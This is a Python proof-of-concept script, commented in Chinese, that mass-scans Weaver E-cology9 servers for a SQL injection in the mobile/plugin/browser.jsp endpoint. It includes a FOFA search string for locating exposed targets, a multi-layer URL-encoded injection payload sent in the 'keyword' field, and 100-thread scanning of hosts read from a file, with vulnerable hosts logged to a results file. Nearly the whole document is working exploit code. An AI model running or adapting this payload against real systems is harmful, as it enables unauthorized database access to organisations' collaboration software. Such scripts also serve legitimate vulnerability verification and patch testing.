#泛微E-cology9 browserjsp SQL注入漏洞复现 
#fofa:app="泛微-协同商务系统"

import requests,sys,argparse,json,re
from multiprocessing.dummy import Pool
# 关闭警告
requests.packages.urllib3.disable_warnings()

def banner():
    test ="""
███████╗ ██████╗ ██╗     
██╔════╝██╔═══██╗██║     
███████╗██║   ██║██║     
╚════██║██║▄▄ ██║██║     
███████║╚██████╔╝███████╗
╚══════╝ ╚══▀▀═╝ ╚══════╝
                                                                                                                                                                                      
"""
    print(test)
def main():
    banner()
    parse = argparse.ArgumentParser(description="泛微E-cology9 browserjsp SQL注入漏洞复现")
    parse.add_argument('-u','--url',dest='url',type=str,help="please input you url")
    parse.add_argument('-f','--file',dest='file',type=str,help="please input you file")
    args = parse.parse_args()
    if args.url and not args.file:
        poc(args.url)

    elif args.file and not args.url:
        url_list = []
        with open('1.txt','r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h") 

def poc(target):
    payload = "/mobile/%20/plugin/browser.jsp"
    headers = {
        'User-Agent':'Mozilla/5.0(WindowsNT10.0;Win64;x64;rv:109.0)Gecko/20100101Firefox/109.0',
        'Connection':'close',
        'Content-Type':'application/x-www-form-urlencoded',
        'Content-Length':'649',
    }
    data = "isDis=1&browserTypeId=269&keyword=%25%32%35%25%33%36%25%33%31%25%32%35%25%33%32%25%33%37%25%32%35%25%33%32%25%33%30%25%32%35%25%33%37%25%33%35%25%32%35%25%33%36%25%36%35%25%32%35%25%33%36%25%33%39%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35%25%32%35%25%33%32%25%33%30%25%32%35%25%33%37%25%33%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%36%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%33%33%25%32%35%25%33%37%25%33%34%25%32%35%25%33%32%25%33%30%25%32%35%25%33%33%25%33%31%25%32%35%25%33%32%25%36%33%25%32%35%25%33%32%25%33%37%25%32%35%25%33%32%25%33%37%25%32%35%25%33%32%25%36%32%25%32%35%25%33%32%25%33%38%25%32%35%25%33%35%25%33%33%25%32%35%25%33%34%25%33%35%25%32%35%25%33%34%25%36%33%25%32%35%25%33%34%25%33%35%25%32%35%25%33%34%25%33%33%25%32%35%25%33%35%25%33%34%25%32%35%25%33%32%25%33%30%25%32%35%25%33%34%25%33%30%25%32%35%25%33%34%25%33%30%25%32%35%25%33%35%25%33%36%25%32%35%25%33%34%25%33%35%25%32%35%25%33%35%25%33%32%25%32%35%25%33%35%25%33%33%25%32%35%25%33%34%25%33%39%25%32%35%25%33%34%25%36%36%25%32%35%25%33%34%25%36%35%25%32%35%25%33%32%25%33%39%25%32%35%25%33%32%25%36%32%25%32%35%25%33%32%25%33%37"
    proxies ={
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    } 
    try:
        res1 = requests.get(url=target+payload,headers=headers,data=data,verify=False,proxies=proxies)
        if res1.status_code==200 and 'SQL' in res1.text:
            print(f'[+]{target}存在漏洞')
            with open('result.txt','a',encoding='utf-8') as fp1:
                fp1.write(target+'\n')
        else:
            print(f'[-]{target}不存在漏洞')
    except requests.RequestException as e:
        print(f"[-] 请求失败: {target}, 错误信息: {e}")
    except json.JSONDecodeError:
        print(f"[-] 无法解码JSON响应: {target}")
    except Exception as e:
        print(f"[-] 处理请求时出错: {target}, 错误信息: {e}")    

if __name__ == "__main__":
    main()